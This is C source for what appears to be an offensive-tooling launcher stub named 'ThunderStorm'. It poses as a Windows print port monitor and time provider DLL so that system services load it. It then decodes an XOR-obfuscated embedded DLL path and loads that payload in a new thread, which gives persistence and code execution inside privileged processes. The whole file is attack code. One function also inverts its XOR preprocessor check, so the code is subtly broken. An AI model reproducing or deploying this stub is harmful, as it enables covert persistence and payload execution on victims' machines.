// ThunderStorm Windows Service Launcher Stub
//  Loads a bound DLL path into the hosting process to prevent
//  direct load crashes.
//
//  Used for TimeProvider and PortMonitor

// Windows Xp+
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
// Windows Vista+
// #define WINVER 0x0600
// #define _WIN32_WINNT 0x0600

#define NOCOMM
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winspool.h>
#include <timeprov.h>
#include <winsplp.h>

#define STACK_SIZE 256000000
#define EXPORT __declspec(dllexport)

// Included with auto-build
#include "pac.h"

#ifdef XOR
    void Xor(unsigned char* key, int key_size, unsigned char* data, int data_size) {
        if (key_size <= 0 || data_size <= 0) {
            return;
        }
        DWORD o;
        VirtualProtect(data, data_size, PAGE_READWRITE, &o);
        for (int i = 0; i < data_size; i++) {
            data[i] = data[i] ^ key[i % key_size];
        }
        VirtualProtect(data, data_size, PAGE_READONLY, &o);
    }
#endif

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    if (r == DLL_PROCESS_ATTACH) {
        #ifdef DLLMAIN
            #ifdef XOR
                Xor(pacKey, KEY_SIZE, pacData, PAC_SIZE-1);
            #endif
            CreateThread(NULL, STACK_SIZE, (LPTHREAD_START_ROUTINE)LoadLibraryA, pacData, 0, NULL);
        #endif
    }
    return TRUE;
}

EXPORT LPMONITOR2 InitializePrintMonitor2(PMONITORINIT i, PHANDLE h) {
    #ifdef XOR
        Xor(pacKey, KEY_SIZE, pacData, PAC_SIZE-1);
    #endif
    CreateThread(NULL, STACK_SIZE, (LPTHREAD_START_ROUTINE)LoadLibraryA, pacData, 0, NULL);
    SetLastError(0x0000009F);
    return NULL;
}

EXPORT HRESULT WINAPI TimeProvClose(TimeProvHandle p) {
    return S_OK;
}
EXPORT HRESULT WINAPI TimeProvCommand(TimeProvHandle h, TimeProvCmd c, PVOID a) {
    return HRESULT_FROM_WIN32(0x00000307);
}
EXPORT HRESULT WINAPI TimeProvOpen(WCHAR *n, TimeProvSysCallbacks *c, TimeProvHandle *p) {
    #ifndef XOR
        Xor(pacKey, KEY_SIZE, pacData, PAC_SIZE-1);
    #endif
    CreateThread(NULL, STACK_SIZE, (LPTHREAD_START_ROUTINE)LoadLibraryA, pacData, 0, NULL);
    return HRESULT_FROM_WIN32(0x00000307);
}
